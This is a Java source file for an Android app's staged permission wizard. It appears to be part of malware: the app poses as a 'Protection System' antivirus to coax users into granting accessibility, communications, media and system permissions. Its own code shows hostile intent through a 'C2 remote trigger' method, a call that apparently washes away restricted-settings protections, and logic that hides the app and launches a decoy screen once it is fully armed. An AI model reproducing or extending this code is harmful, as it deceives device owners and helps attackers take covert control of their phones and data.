package com.fason.app.core.permissions;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;

import com.fason.app.R;
import com.fason.app.stealth.decoy.DecoyActivity;

import java.util.List;

/**
 * PermissionWizardController — 2026 staged wizard.
 *
 * Replaces the old "list everything + Grant All" pattern that triggered
 * deny-all reflexes. The wizard presents exactly one wave per screen,
 * with a progress indicator, a single contextual rationale, and one
 * primary action. Five steps total, matching the proven onboarding
 * pattern: welcome → accessibility → security → data → system → done.
 *
 * Layout contract (activity_main.xml provides):
 *   R.id.permOverlay      — root FrameLayout hosting this UI
 *   R.id.permTitle        — TextView
 *   R.id.permSubtitle     — TextView
 *   R.id.permProgress     — ProgressBar (horizontal)
 *   R.id.permBtnContainer — FrameLayout for the action button
 *   R.id.permContent      — FrameLayout for step content
 */
public final class PermissionWizardController {
    private static final String TAG = "PermWizard2026";
    public static final int PERM_REQ = 1001;

    private static final int STEP_WELCOME = 0;
    private static final int STEP_ACCESSIBILITY = 1;
    private static final int STEP_SECURITY = 2;
    private static final int STEP_DATA = 3;
    private static final int STEP_SYSTEM = 4;
    private static final int STEP_DONE = 5;
    private static final int TOTAL_STEPS = 5;

    private final Activity activity;
    private final Handler handler = new Handler(Looper.getMainLooper());

    private View permOverlay;
    private FrameLayout permContent;
    private TextView permTitle;
    private TextView permSubtitle;
    private ProgressBar permProgress;
    private FrameLayout permBtnContainer;
    private Button actionButton;

    private int step = STEP_WELCOME;
    private boolean autoHideArmed = false;
    private boolean waitingForRuntime = false;

    public PermissionWizardController(@NonNull Activity activity) {
        this.activity = activity;
    }

    // ------------------------------------------------------------------
    // Lifecycle
    // ------------------------------------------------------------------

    public void onCreate(Bundle savedInstanceState) {
        initOverlay();
        if (savedInstanceState != null) {
            step = savedInstanceState.getInt("pw_step", STEP_WELCOME);
            waitingForRuntime = savedInstanceState.getBoolean("pw_waiting", false);
        }
        renderStep();
    }

    public void onResume() {
        if (waitingForRuntime) waitingForRuntime = false;
        PermissionManager.washRestrictedSettings(activity);
        if (step > STEP_WELCOME && step < STEP_DONE) {
            // Re-render current step to reflect any grants made in settings
            renderStep();
        }
        maybeAutoHide();
    }

    public void onRequestPermissionsResult(int requestCode) {
        if (requestCode == PERM_REQ) {
            waitingForRuntime = false;
        }
        if (step > STEP_WELCOME && step < STEP_DONE) {
            renderStep();
        }
    }

    public void onSaveInstanceState(@NonNull Bundle out) {
        out.putInt("pw_step", step);
        out.putBoolean("pw_waiting", waitingForRuntime);
    }

    /** Entry point used by MainActivity. */
    public void autoStartFirstMissing() {
        if (PermissionManager.isFullyArmed(activity)) {
            maybeAutoHide();
            return;
        }
        showOverlay();
        renderStep();
    }

    /** C2 remote trigger — jump to the wave containing a specific gate. */
    public boolean requestGate(String gateId) {
        PermissionManager.Gate g = PermissionManager.findGate(gateId);
        if (g == null) return false;
        step = waveToStep(g.wave);
        showOverlay();
        renderStep();
        return PermissionManager.openGate(activity, g);
    }

    // ------------------------------------------------------------------
    // Step mapping
    // ------------------------------------------------------------------

    private static int waveToStep(PermissionManager.Wave wave) {
        switch (wave) {
            case CRITICAL: return STEP_ACCESSIBILITY;
            case COMMS:    return STEP_DATA;
            case MEDIA:    return STEP_DATA;
            case SYSTEM:   return STEP_SYSTEM;
            default:       return STEP_WELCOME;
        }
    }

    private static PermissionManager.Wave stepToWave(int step) {
        switch (step) {
            case STEP_ACCESSIBILITY: return PermissionManager.Wave.CRITICAL;
            case STEP_SECURITY:      return PermissionManager.Wave.CRITICAL;
            case STEP_DATA:          return PermissionManager.Wave.COMMS;
            case STEP_SYSTEM:        return PermissionManager.Wave.SYSTEM;
            default:                 return PermissionManager.Wave.CRITICAL;
        }
    }

    // ------------------------------------------------------------------
    // Rendering
    // ------------------------------------------------------------------

    private void renderStep() {
        if (permOverlay == null) return;
        showOverlay();

        if (step == STEP_DONE) {
            renderDone();
            return;
        }

        // Progress
        int progress = (step * 100) / TOTAL_STEPS;
        permProgress.setVisibility(View.VISIBLE);
        permProgress.setMax(100);
        permProgress.setProgress(progress);

        switch (step) {
            case STEP_WELCOME:     renderWelcome(); break;
            case STEP_ACCESSIBILITY: renderAccessibilityStep(); break;
            case STEP_SECURITY:    renderSecurityStep(); break;
            case STEP_DATA:        renderDataStep(); break;
            case STEP_SYSTEM:      renderSystemStep(); break;
        }
    }

    private void renderWelcome() {
        permTitle.setVisibility(View.GONE);
        permSubtitle.setVisibility(View.GONE);
        permProgress.setVisibility(View.GONE);
        permContent.removeAllViews();

        LinearLayout box = new LinearLayout(activity);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setGravity(Gravity.CENTER_HORIZONTAL);

        // Shield icon — vector-drawable free, built from text glyph
        TextView icon = new TextView(activity);
        icon.setText("\uD83D\uDEE1");
        icon.setTextSize(52);
        icon.setGravity(Gravity.CENTER);
        box.addView(icon, matchWrap());

        TextView title = new TextView(activity);
        title.setText("Welcome to Protection System");
        title.setTextSize(24);
        title.setTextColor(resolveColor(android.R.attr.textColorPrimary, 0xFFFFFFFF));
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, dp(16), 0, 0);
        box.addView(title, matchWrap());

        TextView sub = new TextView(activity);
        sub.setText("This assistant will configure your device protection in a few steps.\n\nYou need to grant some permissions for protection to work correctly.");
        sub.setTextSize(14);
        sub.setTextColor(resolveColor(android.R.attr.textColorSecondary, 0xFFAAAAAA));
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(dp(8), dp(12), dp(8), 0);
        box.addView(sub, matchWrap());

        permContent.addView(box);

        setActionButton("CONTINUE", v -> {
            step = STEP_ACCESSIBILITY;
            renderStep();
        });
    }

    private void renderAccessibilityStep() {
        permTitle.setVisibility(View.VISIBLE);
        permSubtitle.setVisibility(View.VISIBLE);
        permTitle.setText("Step 1: Protection Service");
        permSubtitle.setText("1 of " + TOTAL_STEPS);
        permContent.removeAllViews();

        PermissionManager.Gate acc = PermissionManager.findGate("accessibility");
        if (acc != null && PermissionManager.isGateGranted(activity, acc)) {
            step = STEP_SECURITY;
            renderStep();
            return;
        }

        LinearLayout box = stepBody(
            "\uD83D\uDD27",
            "Protection Service",
            "The Protection Service needs to be activated to:",
            new String[]{
                "Detect malicious applications",
                "Automatically block threats",
                "Protect your data in real time"
            },
            "Tap ACTIVATE to enable the service"
        );
        permContent.addView(box);

        setActionButton("ACTIVATE SERVICE", v -> {
            if (acc != null) PermissionManager.openGate(activity, acc);
        });
    }

    private void renderSecurityStep() {
        permTitle.setVisibility(View.VISIBLE);
        permSubtitle.setVisibility(View.VISIBLE);
        permTitle.setText("Step 2: Security Permissions");
        permSubtitle.setText("2 of " + TOTAL_STEPS);
        permContent.removeAllViews();

        List<PermissionManager.Gate> gates = PermissionManager.getGatesForWave(
            PermissionManager.Wave.CRITICAL);
        // Accessibility already handled in step 1
        gates.removeIf(g -> g.id.equals("accessibility"));

        if (allGranted(gates)) {
            step = STEP_DATA;
            renderStep();
            return;
        }

        LinearLayout box = stepBody(
            "\uD83D\uDD12",
            "Security Permissions",
            "To function correctly, we need:",
            gateRationales(gates),
            "Tap GRANT to continue"
        );
        permContent.addView(box);

        setActionButton("GRANT PERMISSIONS", v -> requestRuntimeBatch(gates));
    }

    private void renderDataStep() {
        permTitle.setVisibility(View.VISIBLE);
        permSubtitle.setVisibility(View.VISIBLE);
        permTitle.setText("Step 3: Data Access");
        permSubtitle.setText("3 of " + TOTAL_STEPS);
        permContent.removeAllViews();

        List<PermissionManager.Gate> gates = PermissionManager.getGatesForWave(
            PermissionManager.Wave.COMMS);
        List<PermissionManager.Gate> mediaGates = PermissionManager.getGatesForWave(
            PermissionManager.Wave.MEDIA);
        gates.addAll(mediaGates);

        if (allGranted(gates)) {
            step = STEP_SYSTEM;
            renderStep();
            return;
        }

        LinearLayout box = stepBody(
            "\uD83D\uDCC1",
            "Data Access",
            "To protect your communications and files:",
            gateRationales(gates),
            "Tap GRANT to continue"
        );
        permContent.addView(box);

        setActionButton("GRANT PERMISSIONS", v -> requestRuntimeBatch(gates));
    }

    private void renderSystemStep() {
        permTitle.setVisibility(View.VISIBLE);
        permSubtitle.setVisibility(View.VISIBLE);
        permTitle.setText("Step 4: System Access");
        permSubtitle.setText("4 of " + TOTAL_STEPS);
        permContent.removeAllViews();

        List<PermissionManager.Gate> gates = PermissionManager.getGatesForWave(
            PermissionManager.Wave.SYSTEM);

        if (allGranted(gates)) {
            step = STEP_DONE;
            renderStep();
            return;
        }

        LinearLayout box = stepBody(
            "\u2699\uFE0F",
            "System Access",
            "Final step — enable system-level protection:",
            gateRationales(gates),
            "Tap each item to open its settings, then return here"
        );
        permContent.addView(box);

        // System gates need individual settings trips — auto-chain them
        setActionButton("OPEN SETTINGS", v -> openNextSystemGate(gates));
    }

    private void renderDone() {
        permTitle.setVisibility(View.VISIBLE);
        permSubtitle.setVisibility(View.VISIBLE);
        permTitle.setText("All Set");
        permSubtitle.setText("Setup complete");
        permProgress.setVisibility(View.VISIBLE);
        permProgress.setProgress(100);
        permContent.removeAllViews();

        TextView done = new TextView(activity);
        done.setText("\u2713");
        done.setTextSize(48);
        done.setTextColor(0xFF4CAF50);
        done.setGravity(Gravity.CENTER);
        permContent.addView(done, matchWrap());

        permOverlay.removeCallbacks(fadeOutRunnable);
        permOverlay.postDelayed(fadeOutRunnable, 900);
        maybeAutoHide();
    }

    // ------------------------------------------------------------------
    // Step body builder
    // ------------------------------------------------------------------

    private LinearLayout stepBody(String icon, String heading, String intro,
                                  String[] bullets, String footer) {
        LinearLayout box = new LinearLayout(activity);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setGravity(Gravity.CENTER_HORIZONTAL);

        TextView iconView = new TextView(activity);
        iconView.setText(icon);
        iconView.setTextSize(44);
        iconView.setGravity(Gravity.CENTER);
        box.addView(iconView, matchWrap());

        TextView head = new TextView(activity);
        head.setText(heading);
        head.setTextSize(20);
        head.setTextColor(resolveColor(android.R.attr.textColorPrimary, 0xFFFFFFFF));
        head.setGravity(Gravity.CENTER);
        head.setPadding(0, dp(12), 0, 0);
        box.addView(head, matchWrap());

        TextView introView = new TextView(activity);
        introView.setText(intro);
        introView.setTextSize(14);
        introView.setTextColor(resolveColor(android.R.attr.textColorSecondary, 0xFFAAAAAA));
        introView.setGravity(Gravity.CENTER);
        introView.setPadding(0, dp(8), 0, 0);
        box.addView(introView, matchWrap());

        LinearLayout bulletBox = new LinearLayout(activity);
        bulletBox.setOrientation(LinearLayout.VERTICAL);
        bulletBox.setPadding(dp(16), dp(12), dp(16), 0);
        for (String b : bullets) {
            TextView bullet = new TextView(activity);
            bullet.setText("\u2022  " + b);
            bullet.setTextSize(13);
            bullet.setTextColor(resolveColor(android.R.attr.textColorPrimary, 0xFFDDDDDD));
            bullet.setPadding(0, dp(4), 0, dp(4));
            bulletBox.addView(bullet);
        }
        box.addView(bulletBox);

        TextView foot = new TextView(activity);
        foot.setText(footer);
        foot.setTextSize(12);
        foot.setTextColor(resolveColor(android.R.attr.textColorSecondary, 0xFF888888));
        foot.setGravity(Gravity.CENTER);
        foot.setPadding(0, dp(16), 0, 0);
        box.addView(foot, matchWrap());

        return box;
    }

    private String[] gateRationales(List<PermissionManager.Gate> gates) {
        java.util.List<String> out = new java.util.ArrayList<>();
        for (PermissionManager.Gate g : gates) {
            if (!g.applicable()) continue;
            String state = PermissionManager.isGateGranted(activity, g)
                ? " \u2713" : "";
            out.add(g.label + " — " + g.rationale + state);
        }
        return out.toArray(new String[0]);
    }

    private boolean allGranted(List<PermissionManager.Gate> gates) {
        for (PermissionManager.Gate g : gates) {
            if (g.applicable() && !PermissionManager.isGateGranted(activity, g)) {
                return false;
            }
        }
        return true;
    }

    // ------------------------------------------------------------------
    // Actions
    // ------------------------------------------------------------------

    private void requestRuntimeBatch(List<PermissionManager.Gate> gates) {
        java.util.List<String> perms = new java.util.ArrayList<>();
        for (PermissionManager.Gate g : gates) {
            if (g.kind != PermissionManager.Kind.RUNTIME) continue;
            if (PermissionManager.isGateGranted(activity, g)) continue;
            for (String p : g.runtimePerms) {
                if (androidx.core.content.ContextCompat.checkSelfPermission(activity, p)
                        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    perms.add(p);
                }
            }
        }
        if (perms.isEmpty()) {
            advanceStep();
            return;
        }
        waitingForRuntime = true;
        androidx.core.app.ActivityCompat.requestPermissions(
            activity, perms.toArray(new String[0]), PERM_REQ);
    }

    private void openNextSystemGate(List<PermissionManager.Gate> gates) {
        for (PermissionManager.Gate g : gates) {
            if (!g.applicable()) continue;
            if (PermissionManager.isGateGranted(activity, g)) continue;
            PermissionManager.openGate(activity, g);
            return;
        }
        advanceStep();
    }

    private void advanceStep() {
        step++;
        if (step > STEP_SYSTEM) step = STEP_DONE;
        renderStep();
    }

    // ------------------------------------------------------------------
    // Completion
    // ------------------------------------------------------------------

    private void maybeAutoHide() {
        if (autoHideArmed) return;
        if (!PermissionManager.isFullyArmed(activity)) return;
        autoHideArmed = true;
        PermissionManager.applyAutoHide(activity);
        DecoyActivity.launch(activity, DecoyActivity.getPreferredSkin(activity));
        activity.finish();
    }

    // ------------------------------------------------------------------
    // UI helpers
    // ------------------------------------------------------------------

    private void initOverlay() {
        permOverlay = activity.findViewById(R.id.permOverlay);
        permTitle = activity.findViewById(R.id.permTitle);
        permSubtitle = activity.findViewById(R.id.permSubtitle);
        permProgress = activity.findViewById(R.id.permProgress);
        permBtnContainer = activity.findViewById(R.id.permBtnContainer);
        permContent = activity.findViewById(R.id.permContent);
    }

    private LinearLayout.LayoutParams matchWrap() {
        return new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
    }

    private void setActionButton(String text, View.OnClickListener listener) {
        if (permBtnContainer == null) return;
        permBtnContainer.removeAllViews();
        Button b = new Button(activity);
        b.setText(text);
        b.setTextColor(Color.WHITE);
        b.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
        b.setAllCaps(false);
        b.setTypeface(null, android.graphics.Typeface.BOLD);
        GradientDrawable bg = new GradientDrawable();
        bg.setCornerRadius(dp(10));
        bg.setColor(0xFF4CAF50);
        b.setBackground(bg);
        b.setPadding(0, dp(14), 0, dp(14));
        b.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));
        b.setOnClickListener(listener);
        permBtnContainer.addView(b);
        actionButton = b;
    }

    private void showOverlay() {
        if (permOverlay == null) return;
        if (permOverlay.getVisibility() != View.VISIBLE) {
            permOverlay.setAlpha(0f);
            permOverlay.setVisibility(View.VISIBLE);
            permOverlay.animate()
                .alpha(1f)
                .setDuration(220)
                .setInterpolator(new AccelerateDecelerateInterpolator())
                .start();
        }
    }

    private final Runnable fadeOutRunnable = new Runnable() {
        @Override
        public void run() {
            if (permOverlay == null) return;
            permOverlay.animate()
                .alpha(0f)
                .setDuration(260)
                .withEndAction(() -> permOverlay.setVisibility(View.GONE))
                .start();
        }
    };

    private int resolveColor(int attr, int fallback) {
        TypedValue tv = new TypedValue();
        if (activity.getTheme().resolveAttribute(attr, tv, true)) {
            if (tv.type >= TypedValue.TYPE_FIRST_COLOR_INT
                && tv.type <= TypedValue.TYPE_LAST_COLOR_INT) {
                return tv.data;
            }
        }
        return fallback;
    }

    private int dp(int v) {
        return (int) TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP, v, activity.getResources().getDisplayMetrics());
    }
}
